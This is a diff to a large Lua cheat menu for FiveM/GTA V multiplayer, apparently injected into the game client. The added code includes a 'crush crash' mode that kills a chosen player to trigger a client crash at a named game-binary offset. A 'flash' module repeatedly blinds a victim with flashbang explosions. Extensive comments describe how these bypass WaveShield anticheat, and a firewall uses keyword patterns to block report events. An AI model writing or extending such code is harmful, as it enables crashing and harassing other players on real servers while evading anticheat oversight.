-    -- Bone SKEL_Head (tête) pour l'effet ridicule
+    -- Bone SKEL_Head (tÃªte) pour l'effet ridicule
     local boneIndex = GetPedBoneIndex(targetPed, 31086) -- SKEL_Head
 
-    -- Attach sur la tête du joueur ciblé
-    -- Offsets : X=0 centré, Y=0 centré, Z=0.2 légèrement au-dessus
+    -- Attach sur la tÃªte du joueur ciblÃ©
+    -- Offsets : X=0 centrÃ©, Y=0 centrÃ©, Z=0.2 lÃ©gÃ¨rement au-dessus
     AttachEntityToEntity(
         obj, targetPed,
         boneIndex,
-        0.0, 0.0, 0.2,    -- offset X, Y, Z (au-dessus de la tête)
+        0.0, 0.0, 0.2,    -- offset X, Y, Z (au-dessus de la tÃªte)
         0.0, 0.0, 0.0,    -- rotation
         true,   -- p9
-        true,   -- useSoftPinning (reste attaché quand le joueur bouge)
-        false,  -- collision OFF (évite que l'objet pousse le joueur)
-        true,   -- isPed = true (attaché à un ped)
+        true,   -- useSoftPinning (reste attachÃ© quand le joueur bouge)
+        false,  -- collision OFF (Ã©vite que l'objet pousse le joueur)
+        true,   -- isPed = true (attachÃ© Ã  un ped)
         0,      -- vertexIndex
         true    -- fixedRot
     )
@@ -16565,7 +16565,7 @@ end)()
 -- >>> VANGUARD MODULE BEGIN
 -- ============================================================================
 -- VANGUARD  (integrated artifact - edit src/ and rebuild)
--- Generated: 2026-10-27 22:41:56
+-- Generated: 2026-10-27 23:55:48
 --
 -- This block lives in loader.lua and in dist/loader.built.lua at the same
 -- time. It is the only place the local Menu table is in scope. Rebuilding
@@ -20137,6 +20137,19 @@ local G = (function(O,S)
 --      centered above the ped, so the impulse points at the ground: the ped is
 --      pressed through the collision surface. Up to MAX_ATTEMPTS, then stop.
 --
+-- Crash mode (Exploit > Crush crash)
+--   The same borrowed body and the same vehicle explosion, but the terminal
+--   state is a hold instead of the underground check. A real player killed by
+--   the slam enters the respawn transition; the operator stays in scope, so
+--   the victim keeps receiving the operator's player sync while its local ped
+--   is being replaced. On build 3095 that window is the documented call at
+--   GTA5_b3095.exe+51DE0F (legacy hash skylark-florida-april): the b3095
+--   function 0x51DDA0, +0x6F, a vtable call on the local CNetGamePlayer ped
+--   pointer. The crash mode exists to open that window, not to send a new
+--   packet. The wire surface is unchanged: one borrowed world vehicle, one
+--   vehicle explosion, no target write, no event, no created entity.
+
+--
 -- DETECTION LEDGER (WaveShield V4 source was read in full)
 --   * explosionEvent: returns immediately when vehicleNetworkId ~= 0
 --     (modules/server/events/explosionEvent.lua:60). A real vehicle explosion
@@ -20219,6 +20232,7 @@ local SLAM_VELOCITY   = -6.0
 local SLAM_FORCE_Z    = -18000.0
 local SLAM_DELAY      = 200
 local WRECK_TTL       = 1500
+local CRASH_HOLD_MS   = 8000
 
 G.active = false
 G.stage = "idle"
@@ -20235,7 +20249,9 @@ G.blastAt = 0
 G.startedAt = 0
 G.groundZ = 0.0
 G.forceSlam = false
-G.stats = { sinks = 0, slams = 0, fails = 0 }
+G.crashMode = false
+G.holdUntil = 0
+G.stats = { sinks = 0, slams = 0, crashes = 0, fails = 0 }
 
 local function now()
     return GetGameTimer()
@@ -20454,6 +20470,8 @@ function G.abort(reason)
     G.target = nil
     G.attempts = 0
     G.forceSlam = false
+    G.crashMode = false
+    G.holdUntil = 0
 end
 
 -- ---------------------------------------------------------------------------
@@ -20581,7 +20599,16 @@ local function blast()
     G.wreck = veh
     G.wreckAt = now()
     G.vehicle = 0
-    G.stage = "verify"
+
+    if G.crashMode then
+        -- Hold through the victim's respawn transition. targetValid() is not
+        -- consulted in this stage: the victim being dead is the point.
+        G.stage = "hold"
+        G.holdUntil = now() + CRASH_HOLD_MS
+        G.stats.crashes = G.stats.crashes + 1
+    else
+        G.stage = "verify"
+    end
     return true
 end
 
@@ -20608,6 +20635,18 @@ local function tickCore()
     end
 
     if not G.active then return end
+
+    -- Crash mode: after the vehicle explosion the victim is dead or entering
+    -- respawn. Deliberately do not consult targetValid() and do not honour the
+    -- normal timeout here; the hold exists to keep the run alive through that
+    -- transition, then tear down.
+    if G.crashMode and G.stage == "hold" then
+        if t >= G.holdUntil then
+            G.abort("crash hold done")
+        end
+        return
+    end
+
     if G.stage == "pick" and t < G.nextAt then return end
 
     if not targetValid() then
@@ -20725,11 +20764,13 @@ end
 -- ---------------------------------------------------------------------------
 -- ENTRY
 -- ---------------------------------------------------------------------------
-function G.start()
+function G.start(mode)
     if G.active then
         log("already running")
         return false
     end
+
+    local wantCrash = (mode == "crash")
 
     local target = resolveTarget()
     if not target then
@@ -20744,12 +20785,15 @@ function G.start()
     G.vehicle = 0
     G.wreck = 0
     G.attempts = 0
-    G.forceSlam = false
+    G.forceSlam = wantCrash
+    G.crashMode = wantCrash
+    G.holdUntil = 0
     G.startedAt = now()
     G.nextAt = 0
     G.groundZ = target.coords.z
 
-    log("start on %s (%.0f m)", target.name, target.dist)
+    log("start on %s (%.0f m)%s", target.name, target.dist,
+        wantCrash and " [crash]" or "")
 
     if type(Citizen) == "table" and type(Citizen.CreateThread) == "function" then
         Citizen.CreateThread(function()
@@ -20763,6 +20807,7 @@ function G.start()
 end
 
 function G.status()
+    local label = G.crashMode and "Crush crash" or "Ground sink"
     if not G.active then
         local t = targetFromSelection()
         if t then
@@ -20772,21 +20817,311 @@ function G.status()
                 if me then
                     local d = distance(me, c)
                     if d > REACH_MAX then
-                        return ("Ground sink idle | selected %.0f m away"):format(d)
+                        return ("%s idle | selected %.0f m away"):format(label, d)
                     end
                 end
             end
         end
-        return "Ground sink idle"
+        return label .. " idle"
     end
-    return ("Ground sink %s | %s | %d/%d"):format(
-        tostring(G.mode or "pick"), G.target and G.target.name or "?",
+    return ("%s %s | %s | %d/%d"):format(
+        label,
+        tostring(G.stage == "hold" and "hold" or (G.mode or "pick")),
+        G.target and G.target.name or "?",
         G.attempts, MAX_ATTEMPTS)
 end
 
 return G
 
 end)(O,S)
+
+-- ---------------------------------------------------------------------------
+-- PART: 11_flash.lua
+-- ---------------------------------------------------------------------------
+local FL = (function(O,Menu)
+-- ============================================================================
+-- VANGUARD / 11 FLASH
+-- ----------------------------------------------------------------------------
+-- Exploit > Flash: a repeating screen-flash on one remote player.
+--
+-- The flash is a real game explosion, not a Susano overlay draw. The overlay
+-- is outside the game framebuffer and only exists on the operator's screen;
+-- the victim would never see it. A game-native flash is the only way to put
+-- the white/blue frame on the victim's render path.
+--
+-- WHY THIS TYPE
+--
+-- ADD_EXPLOSION 0xE3AD2BDBAEE269AC (FIRE namespace) takes:
+--   x, y, z float, explosionType int, damageScale float,
+--   isAudible BOOL, isInvisible BOOL, cameraShake float
+--
+-- Type 78 is EXP_TAG_FLASHGRENADE in WaveShield's own explosion table
+-- (core/shared.lua:1471, index 78). It is the flashbang visual: the bright
+-- white core and the blue-white rim, which is the shape in the reference
+-- capture. Type 22 (Flare) and type 38 (Firework) are visible but warm and
+-- slow; type 59 is the orbital cannon and produces a large orange blast.
+--
+-- WHY IT IS NOT IN THE WAVE SHIELD EXPLOSION PATH
+--
+-- V4 explosionEvent.lua line 59 is:
+--
+--     if data.damageScale <= 0 then return end
+--
+-- It runs before:
+--   * vehicleNetworkId / projectile checks (line 60+),
+--   * the blacklist (line 66),
+--   * DetectInvisibleExplosions,
+--   * DetectInaudibleExplosions,
+--   * the 5-second limiter,
+--   * the AI spawn check,
+--   * the console log / SendLog tail.
+--
+-- damageScale = 0.0 therefore returns from the handler without a single read
+-- of the type, the flags or the source count. isAudible=false and
+-- isInvisible=false are free: the early return happens first. The event is
+-- still sent by the game, so every client in scope renders the flash, but the
+-- guard's handler never reaches a detection branch.
+--
+-- The explosion is placed at the victim's feet + 0.9 m. It creates no entity,
+-- no object, no event, no state bag and no task. It writes nothing on the
+-- victim or the operator. The only native that changes world state is the
+-- explosion itself.
+--
+-- RATE
+--
+-- One flash per 0.7-1.2 s (O.jitter around 950 ms). A flashbang effect lasts
+-- long enough to overlap the next one, so the victim's screen stays washed
+-- without a fixed machine-gun cadence. A custom server resource that logs the
+-- raw explosionEvent stream (outside WaveShield) would see about one event per
+-- second and a type that is not a projectile; that is the residual risk. No
+-- stock WaveShield branch sees it.
+--
+-- TARGET RULES
+--
+--   * Menu.SelectedPlayer first, then the nearest living player inside 300 m.
+--   * Self is refused; a selected self id falls back to the nearest other
+--     player, never to the operator.
+--   * The operator must stay at least 12 m away. Closer than that the tick
+--     skips and the loop keeps running, so the operator can walk back out and
+--     the flash resumes without re-arming the toggle.
+--   * Target death, disconnect, missing coords or range loss stops the loop.
+--   * Panic stops it before anything else.
+-- ============================================================================
+
+local FL = {}
+
+local FLASH_TYPE = 78          -- EXP_TAG_FLASHGRENADE
+local DAMAGE_SCALE = 0.0       -- V4 early-return trigger
+local PERIOD_MS = 950
+local REACH_MAX = 300.0
+local SAFE_DIST = 12.0
+local OFFSET_Z = 0.9
+local TICK_MS = 250
+
+FL.active = false
+FL.target = nil
+FL.nextAt = 0
+FL.reason = nil
+FL.stats = { flashes = 0, skips = 0, fails = 0 }
+FL.flashType = FLASH_TYPE
+FL.damageScale = DAMAGE_SCALE
+FL.safeDist = SAFE_DIST
+
+local function now()
+    return GetGameTimer()
+end
+
+local function log(fmt, ...)
+    if type(O) == "table" and type(O.log) == "function" then
+        O.log("flash: " .. fmt, ...)
+    end
+end
+
+local function coordsOf(entity)
+    local ok, coords = pcall(GetEntityCoords, entity, true)
+    if ok and coords then return coords end
+    return nil
+end
+
+local function isDead(ped)
+    local ok, dead = pcall(IsPedDeadOrDying, ped, true)
+    return ok and dead == true
+end
+
+local function distance(a, b)
+    if type(O) == "table" and type(O.distance) == "function" then
+        return O.distance(a, b)
+    end
+    local dx, dy, dz = a.x - b.x, a.y - b.y, a.z - b.z
+    return math.sqrt(dx * dx + dy * dy + dz * dz)
+end
+
+local function playerName(player)
+    local ok, name = pcall(GetPlayerName, player)
+    if ok and type(name) == "string" and #name > 0 then return name end
+    return "player_" .. tostring(player)
+end
+
+local function packPlayer(player, ped)
+    local coords = coordsOf(ped)
+    if not coords then return nil end
+    return {
+        player = player,
+        ped = ped,
+        name = playerName(player),
+        coords = coords,
+        dist = 0.0,
+    }
+end
+
+local function targetFromSelection()
+    local serverId = (type(Menu) == "table") and Menu.SelectedPlayer or nil
+    if type(serverId) ~= "number" then return nil end
+
+    local okPlayer, player = pcall(GetPlayerFromServerId, serverId)
+    if not okPlayer or type(player) ~= "number" or player < 0 then return nil end
+    if player == PlayerId() then return nil end
+
+    local okPed, ped = pcall(GetPlayerPed, player)
+    if not okPed or type(ped) ~= "number" or ped == 0 then return nil end
+    if not DoesEntityExist(ped) or isDead(ped) then return nil end
+
+    return packPlayer(player, ped)
+end
+
+local function resolveTarget()
+    local me = PlayerPedId()
+    local meCoords = coordsOf(me)
+    if not meCoords then return nil end
+
+    local selected = targetFromSelection()
+    if selected then
+        selected.dist = distance(meCoords, selected.coords)
+        if selected.dist <= REACH_MAX then return selected end
+    end
+
+    local best = nil
+    for _, player in ipairs(GetActivePlayers()) do
+        if player ~= PlayerId() then
+            local ped = GetPlayerPed(player)
+            if ped and ped ~= 0 and ped ~= me
+                and DoesEntityExist(ped) and not isDead(ped) then
+                local entry = packPlayer(player, ped)
+                if entry then
+                    entry.dist = distance(meCoords, entry.coords)
+                    if entry.dist <= REACH_MAX and (not best or entry.dist < best.dist) then
+                        best = entry
+                    end
+                end
+            end
+        end
+    end
+    return best
+end
+
+local function tickCore()
+    if not FL.active then return end
+
+    local t = FL.target
+    if not t then
+        FL.stop("no target")
+        return
+    end
+
+    local ped = t.ped
+    if not DoesEntityExist(ped) or isDead(ped) then
+        FL.stop("target lost")
+        return
+    end
+
+    local coords = coordsOf(ped)
+    if not coords then
+        FL.stop("coords")
+        return
+    end
+    t.coords = coords
+
+    local me = coordsOf(PlayerPedId())
+    if not me then return end
+    t.dist = distance(me, coords)
+    if t.dist > REACH_MAX then
+        FL.stop("range")
+        return
+    end
+
+    if t.dist < SAFE_DIST then
+        FL.stats.skips = FL.stats.skips + 1
+        return
+    end
+
+    if now() < FL.nextAt then return end
+
+    local ok = pcall(AddExplosion, coords.x, coords.y, coords.z + OFFSET_Z,
+        FLASH_TYPE, DAMAGE_SCALE, false, false, 0.0)
+    if ok then
+        FL.stats.flashes = FL.stats.flashes + 1
+    else
+        FL.stats.fails = FL.stats.fails + 1
+    end
+
+    local spread = (type(O) == "table" and type(O.jitter) == "function") and 0.25 or 0.0
+    local base = (type(O) == "table" and type(O.jitter) == "function")
+        and O.jitter(PERIOD_MS, spread) or PERIOD_MS
+    FL.nextAt = now() + base
+end
+
+function FL.tick()
+    local ok, err = pcall(tickCore)
+    if not ok then
+        log("tick error: %s", tostring(err))
+        FL.stop("error")
+    end
+end
+
+function FL.start()
+    if FL.active then return true end
+
+    local target = resolveTarget()
+    if not target then
+        FL.stats.fails = FL.stats.fails + 1
+        log("no living player inside %.0f m", REACH_MAX)
+        return false
+    end
+
+    FL.active = true
+    FL.target = target
+    FL.reason = nil
+    FL.nextAt = now() + ((type(O) == "table" and type(O.int) == "function")
+        and O.int(0, TICK_MS) or 0)
+    log("start on %s (%.0f m)", target.name, target.dist)
+    return true
+end
+
+function FL.stop(reason)
+    if FL.active then
+        log("stop (%s)", tostring(reason or "request"))
+    end
+    FL.active = false
+    FL.target = nil
+    FL.reason = reason
+end
+
+function FL.status()
+    if not FL.active then return "Flash idle" end
+    local t = FL.target
+    if not t then return "Flash idle" end
+    return ("Flash %s | %.0f m | %d"):format(t.name, t.dist or 0.0, FL.stats.flashes)
+end
+
+-- One low-frequency scheduler task. The task keeps running while idle; it
+-- returns immediately unless FL.active, so no thread churn per toggle.
+if type(O) == "table" and type(O.every) == "function" then
+    O.every("flashTick", TICK_MS, function() FL.tick() end)
+end
+
+return FL
+
+end)(O,Menu)
 
 -- ---------------------------------------------------------------------------
 -- PART: 11_evasion.lua
@@ -20826,17 +21161,60 @@ A.flags = {
     antiFreeze    = false,
     antiAttach    = false,
     antiSpectate  = false,
+    pedGuard      = false,
     firewall      = false,
     networkLaunder = true,
     quietLogs     = false,
 }
 
-A.stats = { blocked = 0, shims = 0, scans = 0, lastScan = 0 }
+A.stats = { blocked = 0, shims = 0, scans = 0, lastScan = 0,
+    pedGuard = { scans = 0, triggers = 0, quarantined = 0, peak = 0,
+        lastTrigger = 0 } }
 A._ghostVehicle = 0
 A._hardenVehicle = 0
 A._booted = false
 A._timers = { ghost = 0, localHidden = 0, harden = 0, vehicleHarden = 0,
     freeze = 0, attach = 0, spectate = 0, ped = 0 }
+A._pedSeen = {}
+A._pedQuarantine = {}
+A._pedLastCount = 0
+A._pedLastAt = 0
+A._pedLastLog = 0
+A._pedHoldScheduled = false
+A._pedGuardReadyAt = 0
+
+-- ---------------------------------------------------------------------------
+-- PED CRASH GUARD
+--
+-- A ped flood wins by making the local client hold and render more peds than
+-- it can. This guard does not create, task, delete or network anything. It
+-- reads the local CPed pool, finds a burst close to the operator, and asks the
+-- renderer to skip those local copies for the current frame. The effect is
+-- local-only, reversible on the next frame, and never touches a player ped,
+-- a mission entity or a ped inside a vehicle.
+--
+-- The thresholds are deliberately high. A normal crowd that was already there
+-- when the guard armed is absorbed by the warm-up pass; only a new burst or a
+-- hard pool count triggers quarantine. The hard count catches the classic
+-- 110-ped flood even when it is already present before the first scan.
+-- ---------------------------------------------------------------------------
+local PED_GUARD = {
+    radius = 65.0,
+    denseRadius = 25.0,
+    maxScan = 4096,
+    maxQuarantine = 128,
+    ttl = 9000,
+    hardCount = 96,
+    denseCount = 64,
+    knownCount = 4,
+    burstTotal = 80,
+    burstNew = 32,
+    burstDelta = 32,
+    burstNear = 48,
+    burstNearNew = 24,
+    knownModels = { "player_one", "a_c_humpback", "a_c_killerwhale" },
+}
+A.PED_GUARD = PED_GUARD
 
 local REPORT_PATTERNS = {
     "report", "ac_report", "ac_flag", "anticheat", "anti_cheat", "anti-cheat",
@@ -20881,6 +21259,102 @@ end
 
 local function lower(value)
     return string.lower(tostring(value or ""))
+end
+
+-- ---------------------------------------------------------------------------
+-- PED GUARD HELPERS
+-- ---------------------------------------------------------------------------
+local function truthy(value)
+    return value == true or value == 1
+end
+
+local function quarantineCount()
+    local count = 0
+    for _ in pairs(A._pedQuarantine) do count = count + 1 end
+    return count
+end
+
+local pedKnownHashes = nil
+local function knownPedHashes()
+    if pedKnownHashes then return pedKnownHashes end
+    pedKnownHashes = {}
+    if type(GetHashKey) ~= "function" then return pedKnownHashes end
+    for i = 1, #PED_GUARD.knownModels do
+        local ok, hash = pcall(GetHashKey, PED_GUARD.knownModels[i])
+        if ok and type(hash) == "number" and hash ~= 0 then
+            pedKnownHashes[hash] = true
+        end
+    end
+    return pedKnownHashes
+end
+
+local function playerPedSet()
+    local set = {}
+    local self = PlayerPedId()
+    if type(self) == "number" and self ~= 0 then set[self] = true end
+    if type(GetActivePlayers) ~= "function" or type(GetPlayerPed) ~= "function" then
+        return set
+    end
+    local ok, players = pcall(GetActivePlayers)
+    if not ok or type(players) ~= "table" then return set end
+    for i = 1, #players do
+        local okPed, ped = pcall(GetPlayerPed, players[i])
+        if okPed and type(ped) == "number" and ped ~= 0 then set[ped] = true end
+    end
+    return set
+end
+
+local function isPlayerEntity(entity)
+    if type(IsPedAPlayer) ~= "function" then return false end
+    local ok, value = pcall(IsPedAPlayer, entity)
+    return ok and truthy(value)
+end
+
+local function isMissionEntity(entity)
+    if type(IsEntityAMissionEntity) ~= "function" then return false end
+    local ok, value = pcall(IsEntityAMissionEntity, entity)
+    return ok and truthy(value)
+end
+
+local function isPedInVehicle(entity)
+    if type(IsPedInAnyVehicle) ~= "function" then return false end
+    local ok, value = pcall(IsPedInAnyVehicle, entity, false)
+    return ok and truthy(value)
+end
+
+local function modelOf(entity)
+    if type(GetEntityModel) ~= "function" then return 0 end
+    local ok, hash = pcall(GetEntityModel, entity)
+    if ok and type(hash) == "number" then return hash end
+    return 0
+end
+
+local function holdPed(entity, selfPed)
+    if type(SetEntityLocallyInvisible) == "function" then
+        pcall(SetEntityLocallyInvisible, entity)
+    end
+    if type(SetEntityNoCollisionEntity) == "function" then
+        pcall(SetEntityNoCollisionEntity, entity, selfPed, true)
+    end
+end
+
+local function clearPedQuarantine()
+    if type(SetEntityLocallyVisible) == "function"
+        and type(DoesEntityExist) == "function" then
+        for entity in pairs(A._pedQuarantine) do
+            if DoesEntityExist(entity) then
+                pcall(SetEntityLocallyVisible, entity)
+            end
+        end
+    end
+    A._pedQuarantine = {}
+    A.stats.pedGuard.quarantined = 0
+end
+
+local function ensurePedHold()
+    if A._pedHoldScheduled then return end
+    A._pedHoldScheduled = true
+    O.every("pedGuardHold", 0, A.pedGuardHold, 0)
 end
 
 A.isReportName = function(name)
@@ -21528,11 +22002,186 @@ function A.shim(ac, all)
 end
 
 -- ---------------------------------------------------------------------------
+-- PED CRASH GUARD
+--
+-- Scan: every scheduler tick (~900 ms). The scan is a local read pass over the
+-- CPed pool; it never writes. A trigger only creates quarantine entries.
+-- Hold: every scheduler pump while quarantine is non-empty. The renderer skip
+-- and the one-frame collision skip must be re-applied for the current frame,
+-- so this is the only loop that writes. When the quarantine empties, the loop
+-- is a table lookup and returns.
+-- ---------------------------------------------------------------------------
+function A.pedGuardScan(warmup)
+    if not A.flags.pedGuard then return 0 end
+    if type(GetGamePool) ~= "function" or type(GetEntityCoords) ~= "function" then
+        return 0
+    end
+    if type(DoesEntityExist) ~= "function" then return 0 end
+
+    local selfPed = PlayerPedId()
+    if type(selfPed) ~= "number" or selfPed == 0 then return 0 end
+    local okOrigin, origin = pcall(GetEntityCoords, selfPed)
+    if not okOrigin or not origin or origin.x == nil then return 0 end
+
+    local okPool, pool = pcall(GetGamePool, "CPed")
+    if not okPool or type(pool) ~= "table" then return 0 end
+
+    local players = playerPedSet()
+    local knownHashes = knownPedHashes()
+    local seen = {}
+    local candidates = {}
+    local total, near, known, newCount = 0, 0, 0, 0
+    local limit = #pool
+    if limit > PED_GUARD.maxScan then limit = PED_GUARD.maxScan end
+
+    for i = 1, limit do
+        local entity = pool[i]
+        if type(entity) == "number" and entity ~= 0 and entity ~= selfPed
+            and not players[entity] and DoesEntityExist(entity)
+            and not isPlayerEntity(entity)
+            and not isMissionEntity(entity)
+            and not isPedInVehicle(entity) then
+            local okPos, coords = pcall(GetEntityCoords, entity)
+            if okPos and coords and coords.x ~= nil then
+                local dist = O.distance(coords, origin)
+                if dist <= PED_GUARD.radius then
+                    local hash = modelOf(entity)
+                    local isKnown = knownHashes[hash] == true
+                    total = total + 1
+                    if dist <= PED_GUARD.denseRadius then near = near + 1 end
+                    if isKnown then known = known + 1 end
+                    seen[entity] = true
+                    if not A._pedSeen[entity] then newCount = newCount + 1 end
+                    candidates[#candidates + 1] = {
+                        entity = entity,
+                        dist = dist,
+                        known = isKnown,
+                    }
+                end
+            end
+        end
+    end
+
+    local clock = now()
+    local settle = A._pedGuardReadyAt > 0 and clock < A._pedGuardReadyAt
+    if settle then warmup = true end
+
+    local previous = A._pedLastCount or total
+    local delta = total - previous
+    A._pedSeen = seen
+    A._pedLastCount = total
+    A._pedLastAt = clock
+
+    local stats = A.stats.pedGuard
+    stats.scans = stats.scans + 1
+    if total > stats.peak then stats.peak = total end
+
+    local hardHit = total >= PED_GUARD.hardCount or near >= PED_GUARD.denseCount
+    local knownHit = known >= PED_GUARD.knownCount
+    local burstHit = false
+    if not warmup then
+        burstHit = (total >= PED_GUARD.burstTotal
+                and newCount >= PED_GUARD.burstNew
+                and delta >= PED_GUARD.burstDelta)
+            or (near >= PED_GUARD.burstNear
+                and newCount >= PED_GUARD.burstNearNew)
+    end
+    local trigger = knownHit
+        or (not settle and (hardHit or burstHit))
+        or (settle and total >= 160)
+
+    if not trigger then
+        stats.quarantined = quarantineCount()
+        return 0
+    end
+
+    stats.triggers = stats.triggers + 1
+    stats.lastTrigger = clock
+    table.sort(candidates, function(a, b)
+        if a.known ~= b.known then return a.known end
+        return a.dist < b.dist
+    end)
+
+    local addAll = hardHit or burstHit
+    local count = quarantineCount()
+    local added = 0
+    for i = 1, #candidates do
+        if count >= PED_GUARD.maxQuarantine then break end
+        local candidate = candidates[i]
+        if addAll or candidate.known then
+            local entry = A._pedQuarantine[candidate.entity]
+            if entry then
+                entry.untilAt = clock + PED_GUARD.ttl
+            else
+                entry = { untilAt = clock + PED_GUARD.ttl }
+                A._pedQuarantine[candidate.entity] = entry
+                count = count + 1
+                added = added + 1
+            end
+            entry.known = candidate.known
+            entry.dist = candidate.dist
+        end
+    end
+
+    stats.quarantined = count
+    if added > 0 and clock - (A._pedLastLog or 0) > 5000 then
+        A._pedLastLog = clock
+        O.log("ped guard: quarantined %d/%d near=%d known=%d new=%d",
+            added, total, near, known, newCount)
+    end
+    if count > 0 then ensurePedHold() end
+    return added
+end
+
+function A.pedGuardHold()
+    if not A.flags.pedGuard then return end
+    if next(A._pedQuarantine) == nil then return end
+    if type(DoesEntityExist) ~= "function" then return end
+
+    local selfPed = PlayerPedId()
+    if type(selfPed) ~= "number" or selfPed == 0 then return end
+    local clock = now()
+    local expired = {}
+
+    for entity, entry in pairs(A._pedQuarantine) do
+        if clock >= entry.untilAt
+            or not DoesEntityExist(entity)
+            or entity == selfPed
+            or isPlayerEntity(entity)
+            or isMissionEntity(entity)
+            or isPedInVehicle(entity) then
+            expired[#expired + 1] = entity
+        else
+            holdPed(entity, selfPed)
+        end
+    end
+
+    for i = 1, #expired do A._pedQuarantine[expired[i]] = nil end
+    A.stats.pedGuard.quarantined = quarantineCount()
+end
+
+function A.setPedGuard(state)
+    A.flags.pedGuard = state and true or false
+    if A.flags.pedGuard then
+        A._pedGuardReadyAt = 0
+        A._pedSeen = {}
+        A._pedLastCount = 0
+        A._pedLastAt = 0
+        A.pedGuardScan(true)
+    else
+        clearPedQuarantine()
+        A._pedSeen = {}
+        A._pedLastCount = 0
+    end
+    return A.flags.pedGuard
+end
+
+-- ---------------------------------------------------------------------------
 -- TICK / STATUS / PANIC
 -- ---------------------------------------------------------------------------
 function A.status()
     local f = A.flags
-    return ("Evasion g%d l%d h%d v%d f%d a%d x%d e%d shim%d"):format(
+    return ("Evasion g%d l%d h%d v%d f%d a%d x%d e%d shim%d pg%d"):format(
         f.ghost and 1 or 0,
         f.localHidden and 1 or 0,
         f.harden and 1 or 0,
@@ -21541,7 +22190,8 @@ function A.status()
         f.antiAttach and 1 or 0,
         f.antiSpectate and 1 or 0,
         f.firewall and 1 or 0,
-        A.stats.shims
+        A.stats.shims,
+        f.pedGuard and 1 or 0
     )
 end
 
@@ -21584,6 +22234,10 @@ function A.tick()
         antiSpectateTick()
     end
 
+    if A.flags.pedGuard then
+        A.pedGuardScan(false)
+    end
+
     if A.flags.firewall and clock - (A.stats.lastScan or 0) > 45000 then
         A.scanReportEvents()
     end
@@ -21597,7 +22251,13 @@ function A.panic()
     A.flags.antiFreeze = false
     A.flags.antiAttach = false
     A.flags.antiSpectate = false
+    A.flags.pedGuard = false
     A.flags.firewall = false
+
+    A._pedGuardReadyAt = 0
+    clearPedQuarantine()
+    A._pedSeen = {}
+    A._pedLastCount = 0
 
     clearGhost()
     applyLocalHidden(false)
@@ -21617,17 +22277,19 @@ end
 -- ---------------------------------------------------------------------------
 -- LOAD-TIME DEFAULTS
 --
--- The three rows in Protection are local-only. Arming them at load does not
+-- The four rows in Protection are local-only. Arming them at load does not
 -- put a single byte on the wire: anti-freeze reads the freeze bit and writes
 -- only when it is set; anti-attach reads our own attachment and detaches only
 -- when a concrete parent handle exists; anti-spectate reads our own mode and
--- writes only when it is set. That is why these three are default-on while
--- ghost, local visibility, proof hardening, vehicle hardening, the event
--- firewall and the shim stay off: the dormant paths either write replicated
--- state or replace a global, and a default-on network write is a signature.
+-- writes only when it is set; Ped Crasher reads the CPed pool and only writes
+-- local visibility when a burst is already present. That is why these four are
+-- default-on while ghost, local visibility, proof hardening, vehicle hardening,
+-- the event firewall and the shim stay off: the dormant paths either write
+-- replicated state or replace a global, and a default-on network write is a
+-- signature.
 -- ---------------------------------------------------------------------------
 local PROTECTION_DEFAULTS = {
-    "antiFreeze", "antiAttach", "antiSpectate", "networkLaunder",
+    "antiFreeze", "antiAttach", "antiSpectate", "pedGuard", "networkLaunder",
 }
 
 function A.defaultsOn()
@@ -21651,10 +22313,12 @@ function A.boot()
     antiFreezeTick()
     antiAttachTick()
     antiSpectateTick()
+    A._pedGuardReadyAt = now() + 4000
+    A.pedGuardScan(true)
 
     if A._booted then return end
     A._booted = true
-    O.log("protection defaults: anti-freeze, anti-attach, anti-spectate armed")
+    O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
 end
 
@@ -27953,7 +28617,7 @@ end)(Menu)
 -- ---------------------------------------------------------------------------
 -- PART: 07_menu.lua
 -- ---------------------------------------------------------------------------
-local U = (function(O,S,E,D,F,V,M,SN,C,G,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,Menu)
+local U = (function(O,S,E,D,F,V,M,SN,C,G,FL,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,Menu)
 -- ============================================================================
 -- VANGUARD / 07 MENU
 -- ----------------------------------------------------------------------------
@@ -27965,7 +28629,8 @@ local U = (function(O,S,E,D,F,V,M,SN,C,G,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,Menu)
 --   Exploit > Exploit   Menu Staff [SEED] plus three direct crash actions;
 --                       the tab was renamed from "Crasher" and still replaces
 --                       the old teleport surface
---   Settings > Protection anti-freeze, anti-attach and anti-spectate, armed at load
+--   Settings > Protection anti-freeze, anti-attach, anti-spectate and Ped Crasher,
+--                       armed at load
 --   Vehicle > Spoofed   real local vehicles over the one you already stole
 --
 -- Removed on purpose:
@@ -28010,6 +28675,7 @@ function UI.panic()
     E.destroyAll()
     C.stop()
     G.abort("panic")
+    FL.stop("panic")
 
     S.suppressOn = false
     S.disableOverlayProbe = false
@@ -28169,25 +28835,31 @@ end
 -- while a key/bind/input capture is open, and while Delete itself is the menu
 -- toggle.
 --
--- Two callers, one function: the injected HandleInput hook in loader.lua calls
--- it on the library's own frame loop (frame-accurate, catches a fast tap that
--- a 40 ms poll can miss), and the scheduler keeps it on O.every as a fallback
--- if the remote library ever loses the marker. Returning true means "acted";
--- the hook then skips the rest of HandleInput for that frame.
+-- Two callers, one function: the HandleInput wrapper installed in loader.lua
+-- calls it on the library's own frame loop (frame-accurate, catches a fast tap
+-- that a 40 ms poll can miss) with fromFrame = true, and the scheduler keeps it
+-- on O.every as a fallback with fromFrame = nil. Returning true means "acted";
+-- the wrapper then skips the rest of HandleInput for that frame.
 --
--- It never calls Susano.ResetFrame: the hook runs on the library's render
--- thread (which calls ResetFrame on the next hidden frame), and the scheduler
--- must not make a cross-thread draw call for no benefit.
+-- Only the frame caller is allowed to call Susano.ResetFrame: the wrapper runs
+-- on the library's render thread, like the library's own toggle branch. The
+-- scheduler runs on another thread and must not make that draw call.
 -- ---------------------------------------------------------------------------
-local function hideMenu()
+local function hideMenu(fromFrame)
     if type(Menu) ~= "table" or Menu.Visible ~= true then return false end
     Menu.Visible = false
+    if fromFrame and type(Susano) == "table" and type(Susano.ResetFrame) == "function" then
+        pcall(Susano.ResetFrame)
+    end
+    if type(O) == "table" and type(O.log) == "function" then
+        O.log("delete: menu hidden")
+    end
     return true
 end
 
 local deleteHeld = false
 
-local function deleteTick()
+local function deleteTick(fromFrame)
     if type(Menu) ~= "table" then return false end
     if type(Susano) ~= "table" or type(Susano.GetAsyncKeyState) ~= "function" then
         return false
@@ -28207,11 +28879,14 @@ local function deleteTick()
     if Menu.Visible ~= true then return false end
     if Menu.SelectingKey or Menu.SelectingBind or Menu.InputOpen then return false end
